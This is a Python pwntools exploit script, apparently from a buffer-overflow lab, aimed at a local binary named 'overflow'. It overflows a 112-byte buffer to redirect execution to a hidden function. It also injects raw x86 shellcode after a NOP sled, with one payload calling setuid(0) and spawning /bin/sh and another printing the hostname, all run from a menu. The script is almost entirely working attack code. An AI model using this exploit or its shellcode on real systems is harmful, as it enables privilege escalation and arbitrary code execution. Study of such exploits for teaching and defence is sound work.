from pwn import *
import sys

NOT_CALLED_ADDR = 0x08048585
BUF_ADDR = 0xffffcfcc

#p = process('./overflow_nonroot')
p = process('./overflow')


#Print the stack
def print_stack():
	gdb.attach(p, '''
		set disassembly-flavor intel
		b gets
		b printf
		c
		x/50x $esp
		b *0xffffd18c
	''')

#print the payload on the buffer
def print_payload():
	gdb.attach(p, '''
		set disassembly-flavor intel
		b gets
		b printf
		c
		b *0xffffd18c
		define hook-stop
		x/100i 0xffffd18c
		end
		c
	''')

def print_secret():
	p.readuntil("name:")
	p.sendline("A"*112 + p32(NOT_CALLED_ADDR))
	print p.readuntil("!")


def get_shell():
	p.readuntil("name:")

	payload = "\x6A\x17\x58\x31\xDB\xCD\x80\x31\xC0\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x31\xC9\x31\xD2\xB0\x0B\xCD\x80"
	
	print len(payload)
	
	payload = payload.rjust(112-len(payload), '\x90').ljust(112, '\x90') #Create nopsled and pad at end
	payload += p32(BUF_ADDR)
	print "Payload:"
	print repr(payload)
	p.sendline(payload)
	p.readuntil("\n")
	p.interactive()

	
def print_hostname():
	p.readuntil("name:")
	payload = "\x31\xc0\x83\xe8\x7a\x8d\x24\x84\xf7\xd8\x89\xe3\xcd\x80\xb0\x04\x8d\x58\xfd\x8d\x4c\x24\x41\x8d\x50\x3c\xcd\x80\xb0\x01\xcd\x80" #len: 32
	payload = payload.rjust(112, '\x90')
	payload += p32(BUF_ADDR)
	#print repr(payload)
	p.sendline(payload)
	p.readuntil("\n")
	print "Hostname of computer is: %s" % p.readuntil("\x00").split("\x00")[0]
	pass

while True:
	print "What would do like to do?"
	print "1) Show stack"
	print "2) Print secret"
	print "3) Print hostname"
	print "4) Get shell"
	print "5) Print payload"
	print "6) Exit"
	decision = raw_input(">")
	decision = decision.rstrip()
	if decision == "1":
		print_stack()
	elif decision == "2":
		print_secret()
		break
	elif decision == "3":
		print_hostname()
		break
	elif decision == "4":
		get_shell()
		break
	elif decision == "5":
		print_payload()
	else:
		break

p.close()
